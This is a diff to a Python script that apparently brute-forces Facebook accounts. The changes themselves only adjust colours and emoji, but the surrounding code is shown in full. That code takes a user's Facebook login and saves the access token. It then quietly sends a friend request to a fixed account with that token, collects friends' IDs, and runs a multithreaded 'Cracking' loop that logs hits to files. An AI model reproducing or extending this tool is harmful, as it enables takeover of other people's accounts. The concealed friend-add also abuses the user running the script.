@@ -121,8 +121,8 @@ def login():
 		print logo
 		print('	   \033[1;96m【\x1b[1;96mLOGIN WITH FACEBOOK\x1b[1;96m】' )
 		print(' \033[1;91mWarning: Do Not Use Your Personal Account' )
-		id = raw_input('\033[1;96m❥ \x1b[1;93mID/Email\x1b[1;93m: \x1b[1;96m')
-		pwd = raw_input('\033[1;96m❥ \x1b[1;93mPassword\x1b[1;93m: \x1b[1;96m')
+		id = raw_input('\033[1;96m🔐 \x1b[1;93mID/Email\x1b[1;93m: \x1b[1;96m')
+		pwd = raw_input('\033[1;96m🔐 \x1b[1;93mPassword\x1b[1;93m: \x1b[1;96m')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
@@ -149,20 +149,20 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\033[1;96m✔\x1b[1;92mLogin Successful'
+				print '\n\033[1;92m✔\x1b[1;92mLogin Successful'
 				os.system('xdg-open https://www.Facebook.com/Omi6t')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\033[1;96m✘\x1b[1;91mThere is no internet connection"
+				print"\n\033[1;91m✘\x1b[1;91mThere is no internet connection"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;96m✘\x1b[1;91mIt seems that your account has a checkpoint")
+			print("\n\033[1;91m✘\x1b[1;91mIt seems that your account has a checkpoint")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\033[1;96m✘\x1b[1;91mPassword/Email is wrong")
+			print("\n\033[1;91m✘\x1b[1;91mPassword/Email is wrong")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -174,7 +174,7 @@ def menu():
 		toket=open('login.txt','r').read()
 	except IOError:
 		os.system('clear')
-		print"\033[1;96m✘ \x1b[1;91mToken invalid"
+		print"\033[1;91m✘ \x1b[1;91mToken invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -185,12 +185,12 @@ def menu():
 		id = a['id']
 	except KeyError:
 		os.system('clear')
-		print"\033[1;96m✘\033[1;91mIt seems that your account has a checkpoint"
+		print"\033[1;91m✘\033[1;91mIt seems that your account has a checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
 	except requests.exceptions.ConnectionError:
-		print"\033[1;96m✘\x1b[1;91mThere is no internet connection"
+		print"\033[1;91m✘\x1b[1;91mThere is no internet connection"
 		keluar()
 	os.system("clear")
 	print logo
@@ -206,7 +206,7 @@ def menu():
 def pilih():
 	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
 	if unikers =="":
-		print "\033[1;96m✘\x1b[1;91mFill in correctly"
+		print "\033[1;91m✘\x1b[1;91mFill in correctly"
 		pilih()
 	elif unikers =="1":
 		super()
@@ -215,7 +215,7 @@ def pilih():
 		os.system('rm -rf login.txt')
 		keluar()
 	else:
-		print "\033[1;96m✘\x1b[1;91mFill in correctly"
+		print "\033[1;91m✘\x1b[1;91mFill in correctly"
 		pilih()
 
 
@@ -225,7 +225,7 @@ def super():
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;96m✘\x1b[1;91mToken invalid"
+		print"\033[1;91m✘\x1b[1;91mToken invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -241,7 +241,7 @@ def super():
 def pilih_super():
 	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
 	if peak =="":
-		print "\033[1;96m✘\x1b[1;91mFill in correctly"
+		print "\033[1;91m✘\x1b[1;91mFill in correctly"
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
@@ -262,10 +262,10 @@ def pilih_super():
 			op = json.loads(jok.text)
 			print"\033[1;96m👤\033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
 		except KeyError:
-			print"\033[1;96m✘\x1b[1;91mID Not Found!"
+			print"\033[1;91m✘\x1b[1;91mID Not Found!"
 			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 			super()
-		jalan('\033[1;96m✔\033[1;93mGetting IDs \033[1;97m...')
+		jalan('\033[1;93m✔\033[1;93mGetting IDs \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -279,20 +279,20 @@ def pilih_super():
 			for line in open(idlist,'r').readlines():
 				id.append(line.strip())
 		except IOError:
-			print '\x1b[1;96m✘\x1b[1;91mFile Not Found'
+			print '\x1b[1;91m✘\x1b[1;91mFile Not Found'
 			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
 			super()
 	elif peak =="0":
 		menu()
 	else:
-		print "\033[1;96m✘\x1b[1;91mFill in correctly"
+		print "\033[1;91m✘\x1b[1;91mFill in correctly"
 		pilih_super()
 	
 	print "\033[1;96m👤\033[1;93mTotal IDs \033[1;91m: \033[1;97m"+str(len(id))
-	jalan('\033[1;96m✔\033[1;93mStarting \033[1;97m...')
+	jalan('\033[1;93m✔\033[1;93mStarting \033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m✔\033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;93m✔\033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
 	print('\x1b[1;93m✘\x1b[1;93mTo Stop Process Press CTRL Then Press Z')
 	print "\033[1;96m«--------------------✧--------------------»"
@@ -415,9 +415,9 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;96m«--------------------✧--------------------»"
-	print '\033[1;96m✔\033[1;92mProcess Has Been Completed \033[1;97m....'
-	print"\033[1;96m✔\033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
-	print("\033[1;96m✔\033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
+	print '\033[1;92m✔\033[1;92mProcess Has Been Completed \033[1;97m....'
+	print"\033[1;92m✔\033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
+	print("\033[1;92m✔\033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	menu()
 
